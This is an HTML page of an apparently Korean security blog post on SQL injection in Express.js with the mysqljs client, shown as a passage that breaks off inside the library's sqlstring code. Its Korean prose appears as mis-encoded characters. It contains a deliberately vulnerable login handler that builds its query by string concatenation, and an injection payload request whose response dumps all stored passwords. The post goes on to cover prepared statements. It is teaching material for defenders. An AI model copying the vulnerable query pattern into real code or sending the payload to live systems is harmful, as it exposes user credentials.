<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="google-site-verification" content="soS2al0KuMZmiyPzu87KFbqGSn0K9edQ8EkWp_m35n0" />
  

  <!-- Begin Jekyll SEO tag v2.6.1 -->
<title>Express.js + MySQL SQLi | Core-Research-Team</title>
<meta name="generator" content="Jekyll v4.0.1" />
<meta property="og:title" content="Express.js + MySQL SQLi" />
<meta name="author" content="jeong.su" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Express.js + MySQL SQLi" />
<meta property="og:description" content="Express.js + MySQL SQLi" />
<link rel="canonical" href="http://172.26.12.255:4000/2020-10-01/Expressjs" />
<meta property="og:url" content="http://172.26.12.255:4000/2020-10-01/Expressjs" />
<meta property="og:site_name" content="Core-Research-Team" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-10-01T00:00:00+00:00" />
<script type="application/ld+json">
{"@type":"BlogPosting","url":"http://172.26.12.255:4000/2020-10-01/Expressjs","headline":"Express.js + MySQL SQLi","dateModified":"2020-10-01T00:00:00+00:00","datePublished":"2020-10-01T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://172.26.12.255:4000/2020-10-01/Expressjs"},"author":{"@type":"Person","name":"jeong.su"},"description":"Express.js + MySQL SQLi","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <!-- CSS -->
  <link rel="stylesheet" href="/assets/main.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">

  <!-- Favicon -->
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon.ico">

  <!-- RSS -->
  <link type="application/atom+xml" rel="alternate" href="http://172.26.12.255:4000/feed.xml" title="Core-Research-Team" />

  <!-- Google Analytics-->
  
 
</head>


  <body>

    <nav class="nav">
  <div class="nav-container">
    <a href="/">
      <h2 class="nav-title">RAON - Core Research Team</h2>
    </a>
    <ul>
      <li><a href="/about">About</a></li>
      <li><a href="/">Posts</a></li>
    </ul>
  </div>
</nav>


    <main>
      <div class="post"> 
   <h1 class="post-title">Express.js + MySQL SQLi</h1>
   <div class="post-line"></div>

   
      
         
            <span class="tag"><center><i>Web</i></center></span>
         
      
         
            <span class="tag"><center><i>node.js</i></center></span>
         
      
   
   
   <ul>
  <li><a href="#expressjs--mysql-sqli">Express.js + MySQL SQLi</a></li>
  <li><a href="#summary">Summary</a></li>
  <li><a href="#expressjs">Express.js</a>
    <ul>
      <li><a href="#install">Install</a></li>
      <li><a href="#hello-world">Hello world</a></li>
    </ul>
  </li>
  <li><a href="#mysql">MySQL</a>
    <ul>
      <li><a href="#install-1">Install</a></li>
      <li><a href="#hello-world-1">Hello world</a></li>
    </ul>
  </li>
  <li><a href="#expressjs--mysql">Express.js + MySQL</a>
    <ul>
      <li><a href="#login-example">Login Example</a></li>
      <li><a href="#sqli-ì·¨ì•½ì ">SQLi ì·¨ì•½ì </a></li>
      <li><a href="#sql-prepared-statement">SQL Prepared Statement</a></li>
      <li><a href="#ë˜-ë‹¤ì‹œ-sqli">ë˜ ë‹¤ì‹œ SQLi</a></li>
      <li><a href="#ëŒ€ì‘-ë°©ì•ˆ">ëŒ€ì‘ ë°©ì•ˆ</a></li>
    </ul>
  </li>
  <li><a href="#ë§ˆë¬´ë¦¬">ë§ˆë¬´ë¦¬</a></li>
</ul>
   
   <h1 id="expressjs--mysql-sqli">Express.js + MySQL SQLi</h1>

<blockquote>
  <p>2020.09
ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ìµœì •ìˆ˜
jeon95u@gmail.com</p>
</blockquote>

<h1 id="summary">Summary</h1>

<p>Node.jsë¥¼ ìœ„í•œ ì›¹ í”„ë ˆì¸ì›Œí¬ì¸ Express.jsì—ì„œ MySQLë¥¼ ì—°ë™í•˜ì—¬ ì‚¬ìš©í•  ë•Œ ë°œìƒ í•  ìˆ˜ ìˆëŠ” SQL Injection ì·¨ì•½ì ì— ëŒ€í•´ì„œ ì„¤ëª…í•˜ê³  Prepared statementë¥¼ ì ìš© í–ˆì„ë•Œ ë°œìƒ í•  ìˆ˜ ìˆëŠ” ê²½ìš°ì— ëŒ€í•´ì„œ ì„¤ëª…í•©ë‹ˆë‹¤.</p>

<h1 id="expressjs">Express.js</h1>

<p>Express.jsëŠ” Node.jsë¥¼ ìœ„í•œ ë¹ ë¥´ê³  ê°œë°©ì ì¸ ê°„ê²°í•œ ì›¹ í”„ë ˆì„ì›Œí¬ì…ë‹ˆë‹¤.</p>

<p><a href="https://expressjs.com/">https://expressjs.com/</a></p>

<blockquote>
  <p>Fast, unopinionated, minimalist web framework for Node.js</p>
</blockquote>

<h2 id="install">Install</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>myapp
<span class="nb">cd </span>myapp

npm init

npm <span class="nb">install </span>express <span class="nt">--save</span>
</code></pre></div></div>

<p>Express.jsëŠ” ìœ„ì™€ ê°™ì€ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•´ì„œ ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

<h2 id="hello-world">Hello world</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// app.js
const express <span class="o">=</span> require<span class="o">(</span><span class="s1">'express'</span><span class="o">)</span>
const app <span class="o">=</span> express<span class="o">()</span>
const port <span class="o">=</span> 3000

app.get<span class="o">(</span><span class="s1">'/'</span>, <span class="o">(</span>req, res<span class="o">)</span> <span class="o">=&gt;</span> <span class="o">{</span>
	res.send<span class="o">(</span><span class="s1">'Hello World!'</span><span class="o">)</span>
<span class="o">})</span>

app.listen<span class="o">(</span>port, <span class="o">()</span> <span class="o">=&gt;</span> <span class="o">{</span>
	console.log<span class="o">(</span><span class="sb">`</span>Example app listening at http://localhost:<span class="k">${</span><span class="nv">port</span><span class="k">}</span><span class="sb">`</span><span class="o">)</span>
<span class="o">})</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node app.js
</code></pre></div></div>

<p>Express.jsëŠ” ìœ„ì™€ ê°™ì´ ê°„ë‹¨í•œ ì½”ë“œë¡œ ì›¹ ì„œë¹„ìŠ¤ ì–´í”Œë¦¬ì¼€ì´ì…˜ì„ ê°œë°œí•˜ê³  ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

<h1 id="mysql">MySQL</h1>

<p>Node.jsì—ì„œ MySQLì„ ì‚¬ìš©í•˜ê¸° ìœ„í•´ì„œ JavaScript Client ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•œë‹¤.</p>

<p><a href="https://github.com/mysqljs/mysql">https://github.com/mysqljs/mysql</a></p>

<blockquote>
  <p>A pure node.js JavaScript Client implementing the MySQL protocol.</p>
</blockquote>

<h2 id="install-1">Install</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npm <span class="nb">install </span>mysql
</code></pre></div></div>

<p>mysql client ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” ìœ„ì™€ ê°™ì€ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•´ì„œ ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

<h2 id="hello-world-1">Hello world</h2>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// mysql_test.js</span>
<span class="kd">var</span> <span class="nx">mysql</span>      <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">mysql</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">connection</span> <span class="o">=</span> <span class="nx">mysql</span><span class="p">.</span><span class="nx">createConnection</span><span class="p">({</span>
  <span class="na">host</span>     <span class="p">:</span> <span class="dl">'</span><span class="s1">localhost</span><span class="dl">'</span><span class="p">,</span>
  <span class="na">user</span>     <span class="p">:</span> <span class="dl">'</span><span class="s1">me</span><span class="dl">'</span><span class="p">,</span>
  <span class="na">password</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">secret</span><span class="dl">'</span><span class="p">,</span>
  <span class="na">database</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">my_db</span><span class="dl">'</span>
<span class="p">});</span>

<span class="nx">connection</span><span class="p">.</span><span class="nx">connect</span><span class="p">();</span>

<span class="nx">connection</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="dl">'</span><span class="s1">SELECT 1 + 1 AS solution</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">results</span><span class="p">,</span> <span class="nx">fields</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="k">throw</span> <span class="nx">error</span><span class="p">;</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">The solution is: </span><span class="dl">'</span><span class="p">,</span> <span class="nx">results</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">solution</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">connection</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span>
</code></pre></div></div>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">node</span> <span class="nx">mysql_test</span><span class="p">.</span><span class="nx">js</span>
</code></pre></div></div>

<p>Node.js ê¸°ë°˜ì˜ MySQL JavaScript clientëŠ” ìœ„ ì˜ˆì œì™€ ê°™ì´ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

<h1 id="expressjs--mysql">Express.js + MySQL</h1>

<h2 id="login-example">Login Example</h2>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// app.js</span>
<span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
<span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">3000</span>

<span class="kd">const</span> <span class="nx">mysql</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">mysql</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">connection</span> <span class="o">=</span> <span class="nx">mysql</span><span class="p">.</span><span class="nx">createConnection</span><span class="p">({</span>
  <span class="na">host</span>     <span class="p">:</span> <span class="dl">'</span><span class="s1">localhost</span><span class="dl">'</span><span class="p">,</span>
  <span class="na">user</span>     <span class="p">:</span> <span class="dl">'</span><span class="s1">root</span><span class="dl">'</span><span class="p">,</span>
  <span class="na">password</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">autoset</span><span class="dl">'</span><span class="p">,</span>
  <span class="na">database</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">test</span><span class="dl">'</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/login</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
	<span class="nx">connection</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="dl">'</span><span class="s1">SELECT * FROM user WHERE id = "</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">id</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">"</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">results</span><span class="p">,</span> <span class="nx">fields</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="k">throw</span> <span class="nx">error</span><span class="p">;</span>
		<span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">results</span><span class="p">);</span>
	<span class="p">});</span>
<span class="p">})</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`Example app listening at http://localhost:</span><span class="p">${</span><span class="nx">port</span><span class="p">}</span><span class="s2">`</span><span class="p">)</span>
<span class="p">})</span>
</code></pre></div></div>

<p>Express.js + MySQLë¥¼ ì‚¬ìš©í•´ì„œ loginì„ ê°„ë‹¨íˆ êµ¬í˜„í•œ ì˜ˆì œì…ë‹ˆë‹¤.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:3000/login HTTP/1.1
Host: 127.0.0.1:3000
Content-Length: 14
content-type: application/json

{"id":"guest"}
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 29
Date: Tue, 29 Sep 2020 12:15:56 GMT
Connection: keep-alive
Cache-Control: no-cache

[{"id":"guest","pw":"guest"}]
</code></pre></div></div>

<p>ì •ìƒì ì¸ ì‚¬ìš©ì„ í–ˆì„ ë•Œì˜ ìš”ì²­(Request)ê³¼ ì‘ë‹µ(Response)ì…ë‹ˆë‹¤.</p>

<p><code class="highlighter-rouge">id</code>ë¡œ <code class="highlighter-rouge">guest</code>ë¥¼ ìš”ì²­ í–ˆì„ ë•Œ <code class="highlighter-rouge">guest</code> ê³„ì •ì˜ <code class="highlighter-rouge">id</code>ì™€ <code class="highlighter-rouge">pw</code>ë¥¼ ì •ìƒì ìœ¼ë¡œ ë¶ˆëŸ¬ì˜¤ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

<h2 id="sqli-ì·¨ì•½ì ">SQLi ì·¨ì•½ì </h2>

<p>ì—¬ëŸ¬ë¶„ì€ <code class="highlighter-rouge">Login Example</code>ì¸ <code class="highlighter-rouge">app.js</code> ì½”ë“œì—ì„œ ì·¨ì•½í•œ ë¶€ë¶„ì„ ë°œê²¬ í•˜ì…¨ë‚˜ìš”?</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="dl">'</span><span class="s1">SELECT * FROM user WHERE id = "</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">id</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">"</span><span class="dl">'</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">connection.query</code>ì˜ ì²« ë²ˆì§¸ ì¸ìë¡œ SQL Queryê°€ ë„˜ì–´ê°€ëŠ”ë° ìœ„ì™€ ê°™ì´ ë¬¸ìì—´ì„ ê·¸ëŒ€ë¡œ ì´ì–´ ë¶™ì´ê¸° ë•Œë¬¸ì— SQLi ì·¨ì•½ì ì´ ë°œìƒí•˜ê²Œ ë©ë‹ˆë‹¤.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:3000/login HTTP/1.1
Host: 127.0.0.1:3000
content-type: application/json
Content-Length: 19
Pragma: no-cache

{"id":"\" || 1-- "}
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 160
Date: Tue, 29 Sep 2020 12:22:35 GMT
Connection: keep-alive
Cache-Control: no-cache

[{"id":"admin","pw":"hello"},{"id":"guest","pw":"guest"},{"id":"1test","pw":"pw"},{"id":"12test","pw":"pw"},{"id":"2test","pw":"pw"},{"id":"123test","pw":"pw"}]
</code></pre></div></div>

<p>SQLi ê³µê²©ì„ í–ˆì„ ë•Œì˜ ìš”ì²­(Request)ê³¼ ì‘ë‹µ(Response)ì…ë‹ˆë‹¤.</p>

<p><code class="highlighter-rouge">id</code>ì— <code class="highlighter-rouge">" || 1--</code> ê°’ì´ ë“¤ì–´ê°”ê¸° ë•Œë¬¸ì— ìµœì¢…ì ìœ¼ë¡œ <code class="highlighter-rouge">SELECT * FROM user WHERE id = "" || 1-- "</code></p>

<p>ì¿¼ë¦¬ë¬¸ì´ ë§Œë“¤ì–´ì¡Œê³  ëª¨ë“  Rowë¥¼ ë¦¬í„´í•˜ê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.</p>

<p><img src="/assets/2020-10-01/202010_soo.png" alt="/assets/2020-10-01/202010_soo.png" /></p>

<center><b>MySQL Query Log</b></center>

<p>MySQL Query Logë¥¼ í†µí•´ì„œë„ ì‹¤ì œë¡œ Injectionì— ì„±ê³µí•œ ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

<h2 id="sql-prepared-statement">SQL Prepared Statement</h2>

<p>ìœ„ì™€ ê°™ì€ SQLi ì·¨ì•½ì ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ì„œ MySQL JavaScript Clientì—ì„œ <code class="highlighter-rouge">Prepared Statement</code> ê¸°ëŠ¥ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ì‰½ê²Œ ë§í•´ì„œ SQL ì¿¼ë¦¬ë¥¼ ë§Œë“¤ ë•Œ ì¸ìë¥¼ ì•Œì•„ì„œ escape ì²˜ë¦¬í•˜ì—¬ SQLi ì·¨ì•½ì ì´ ë°œìƒí•˜ì§€ ì•Šë„ë¡ ë§Œë“¤ì–´ ì¤ë‹ˆë‹¤.</p>

<p>ê·¸ëŸ¬ë©´ ìœ„ì—ì„œ ë‹¤ë£¨ì—ˆë˜ ë¡œê·¸ì¸ ì˜ˆì œ ì½”ë“œì— Prepared Statementë¥¼ ì ìš© í•´ë³¼ê¹Œìš”?</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// app.js</span>
<span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
<span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">3000</span>

<span class="kd">const</span> <span class="nx">mysql</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">mysql</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">connection</span> <span class="o">=</span> <span class="nx">mysql</span><span class="p">.</span><span class="nx">createConnection</span><span class="p">({</span>
  <span class="na">host</span>     <span class="p">:</span> <span class="dl">'</span><span class="s1">localhost</span><span class="dl">'</span><span class="p">,</span>
  <span class="na">user</span>     <span class="p">:</span> <span class="dl">'</span><span class="s1">root</span><span class="dl">'</span><span class="p">,</span>
  <span class="na">password</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">autoset</span><span class="dl">'</span><span class="p">,</span>
  <span class="na">database</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">test</span><span class="dl">'</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/login</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
	<span class="nx">connection</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="dl">'</span><span class="s1">SELECT * FROM user WHERE id = ?</span><span class="dl">'</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">results</span><span class="p">,</span> <span class="nx">fields</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="k">throw</span> <span class="nx">error</span><span class="p">;</span>
		<span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">results</span><span class="p">);</span>
	<span class="p">});</span>
<span class="p">})</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`Example app listening at http://localhost:</span><span class="p">${</span><span class="nx">port</span><span class="p">}</span><span class="s2">`</span><span class="p">)</span>
<span class="p">})</span>
</code></pre></div></div>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">connection</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="dl">'</span><span class="s1">SELECT * FROM user WHERE id = "</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">id</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">"</span><span class="dl">'</span><span class="p">,</span>
</code></pre></div></div>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">connection</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="dl">'</span><span class="s1">SELECT * FROM user WHERE id = ?</span><span class="dl">'</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span>
</code></pre></div></div>

<p>queryë¬¸ì— <code class="highlighter-rouge">?</code>ë¥¼ ì‚¬ìš©í–ˆê³  2ë²ˆì§¸ ì¸ìë¡œ <code class="highlighter-rouge">req.body.id</code>ë¥¼ ë„˜ê²¨ ì¤Œìœ¼ë¡œì¨ Prepared Statementë¥¼ ì ìš©í–ˆìŠµë‹ˆë‹¤. ìœ„ì— ì½”ë“œì—ì„œ ì•„ë˜ ì½”ë“œë¡œ ë³€ê²½ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

<p>ì›ë¦¬ë¥¼ ì‚´í´ë³´ê³ ì ì¡°ê¸ˆ ë” ìì„¸íˆ ë¶„ì„í•´ë³´ë©´ <code class="highlighter-rouge">Connection.js</code>ì—ì„œ <code class="highlighter-rouge">sql</code>, <code class="highlighter-rouge">values</code>ë¥¼ <code class="highlighter-rouge">format</code>í•¨ìˆ˜ì— ë„£ì–´ ì¤ë‹ˆë‹¤.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// node_modules/mysql/lib/Connection.js</span>
<span class="nx">Connection</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">query</span> <span class="o">=</span> <span class="kd">function</span> <span class="nx">query</span><span class="p">(</span><span class="nx">sql</span><span class="p">,</span> <span class="nx">values</span><span class="p">,</span> <span class="nx">cb</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">query</span> <span class="o">=</span> <span class="nx">Connection</span><span class="p">.</span><span class="nx">createQuery</span><span class="p">(</span><span class="nx">sql</span><span class="p">,</span> <span class="nx">values</span><span class="p">,</span> <span class="nx">cb</span><span class="p">);</span>
  <span class="nx">query</span><span class="p">.</span><span class="nx">_connection</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="k">typeof</span> <span class="nx">sql</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">object</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="dl">'</span><span class="s1">typeCast</span><span class="dl">'</span> <span class="k">in</span> <span class="nx">sql</span><span class="p">))</span> <span class="p">{</span>
    <span class="nx">query</span><span class="p">.</span><span class="nx">typeCast</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">typeCast</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="nx">query</span><span class="p">.</span><span class="nx">sql</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">query</span><span class="p">.</span><span class="nx">sql</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">format</span><span class="p">(</span><span class="nx">query</span><span class="p">.</span><span class="nx">sql</span><span class="p">,</span> <span class="nx">query</span><span class="p">.</span><span class="nx">values</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="nx">query</span><span class="p">.</span><span class="nx">_callback</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">query</span><span class="p">.</span><span class="nx">_callback</span> <span class="o">=</span> <span class="nx">wrapCallbackInDomain</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="nx">query</span><span class="p">.</span><span class="nx">_callback</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">this</span><span class="p">.</span><span class="nx">_implyConnect</span><span class="p">();</span>

  <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">_protocol</span><span class="p">.</span><span class="nx">_enqueue</span><span class="p">(</span><span class="nx">query</span><span class="p">);</span>
<span class="p">};</span>
</code></pre></div></div>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// node_modules/mysql/index.js</span>
<span class="nx">exports</span><span class="p">.</span><span class="nx">format</span> <span class="o">=</span> <span class="kd">function</span> <span class="nx">format</span><span class="p">(</span><span class="nx">sql</span><span class="p">,</span> <span class="nx">values</span><span class="p">,</span> <span class="nx">stringifyObjects</span><span class="p">,</span> <span class="nx">timeZone</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">SqlString</span> <span class="o">=</span> <span class="nx">loadClass</span><span class="p">(</span><span class="dl">'</span><span class="s1">SqlString</span><span class="dl">'</span><span class="p">);</span>

  <span class="k">return</span> <span class="nx">SqlString</span><span class="p">.</span><span class="nx">format</span><span class="p">(</span><span class="nx">sql</span><span class="p">,</span> <span class="nx">values</span><span class="p">,</span> <span class="nx">stringifyObjects</span><span class="p">,</span> <span class="nx">timeZone</span><span class="p">);</span>
<span class="p">};</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">format</code> í•¨ìˆ˜ëŠ” <code class="highlighter-rouge">sqlstring</code>ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">SqlString</span><span class="p">.</span><span class="nx">format</span> <span class="o">=</span> <span class="kd">function</span> <span class="nx">format</span><span class="p">(</span><span class="nx">sql</span><span class="p">,</span> <span class="nx">values</span><span class="p">,</span> <span class="nx">stringifyObjects</span><span class="p">,</span> <span class="nx">timeZone</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">values</span> <span class="o">==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">sql</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">values</span> <span class="k">instanceof</span> <span class="nb">Array</span> <span class="o">||</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">isArray</span><span class="p">(</span><span class="nx">values</span><span class="p">)))</span> <span class="p">{</span>
    <span class="nx">values</span> <span class="o">=</span> <span class="p">[</span><span class="nx">values</span><span class="p">];</span>
  <span class="p">}</span>

  <span class="kd">var</span> <span class="nx">chunkIndex</span>        <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">placeholdersRegex</span> <span class="o">=</span> <span class="sr">/</span><span class="se">\?</span><span class="sr">+/g</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">result</span>            <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">valuesIndex</span>       <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">match</span><span class="p">;</span>

  <span class="k">while</span> <span class="p">(</span><span class="nx">valuesIndex</span> <span class="o">&lt;</span> <span class="nx">values</span><span class="p">.</span><span class="nx">length</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">match</span> <span class="o">=</span> <span class="nx">placeholdersRegex</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">sql</span><span class="p">)))</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">len</span> <span class="o">=</span> <span class="nx">match</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">length</span><span class="p">;</span>

